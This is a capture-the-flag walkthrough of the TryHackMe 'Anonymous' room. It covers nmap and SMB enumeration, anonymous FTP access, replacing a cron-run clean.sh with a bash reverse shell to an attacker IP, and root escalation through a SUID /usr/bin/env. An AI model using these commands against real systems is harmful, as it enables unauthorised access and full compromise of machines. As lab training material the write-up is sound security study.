# [Anonymous](https://tryhackme.com/room/anonymous)

## Not the hacking group

# Pwn

### Enumerate the machine. How many ports are open?

1. There are **4** open ports

```bash
nmap -sV -p- <TARGET_IP>
```

<img width="722" height="240" alt="SCREEN01" src="https://github.com/user-attachments/assets/64a593e0-7913-4e28-a221-63743b18c6bf" />

---

### What service is running on port 21?

1. **ftp** is running on port 21

---

### What service is running on ports 139 and 445?

1. The service is **smb**

---

### There's a share on the user's computer. What's it called?

1. Enumerate SMB shares using smbclient
   - The folder is **pics**

```bash
smbclient -L //<TARGET_IP> -N
```
<img width="723" height="143" alt="SCREEN02" src="https://github.com/user-attachments/assets/a432f691-79ae-4c4a-9b8b-60da86a1ad24" />

---

### user.txt

_What's that log file doing there?... nc won't work the way you'd expect it to_

1. Access the FTP server using anonymous login and examine available files:

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd script
ls -la
mget *
```

2. Examine the downloaded files locally. The `clean.sh` script appears to be executed periodically. Create a reverse shell payload

```bash
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> clean.sh
```

3. Upload the modified script back to the FTP server

```bash
put clean.sh
```

4. Set up a netcat listener and wait for the scheduled execution. Once the reverse shell is established, locate the user flag

```bash
nc -lvnp 4444
cat user.txt
```

<img width="719" height="216" alt="SCREEN03" src="https://github.com/user-attachments/assets/86f4d84d-d4b7-4efb-90cf-0d77ea399158" />

---

### root.txt

_This may require you to do some outside research_

1. Search for SUID binaries that can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

2. The `/usr/bin/env` binary has SUID permissions set. This can be exploited to spawn a root shell

```bash
/usr/bin/env /bin/sh -p
```

3. Verify root access and retrieve the root flag

```bash
whoami
cat /root/root.txt
```

<img width="719" height="196" alt="SCREEN04" src="https://github.com/user-attachments/assets/a6c0a4ec-c952-42a4-9420-54716f9e922f" />
